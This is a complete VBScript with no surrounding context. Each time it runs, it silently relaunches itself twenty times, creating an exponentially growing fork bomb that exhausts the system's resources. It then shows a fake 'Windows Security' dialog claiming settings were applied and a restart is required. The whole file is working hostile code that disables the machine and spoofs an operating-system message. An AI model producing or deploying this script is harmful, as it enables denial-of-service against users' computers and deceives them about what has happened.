Set shell = CreateObject("WScript.Shell")

For i = 1 To 20
    shell.Run "wscript """ & WScript.ScriptFullName & """", 0, False
Next

shell.Popup "Windows has applied new settings. Restart required.", 0, "Windows Security", 64
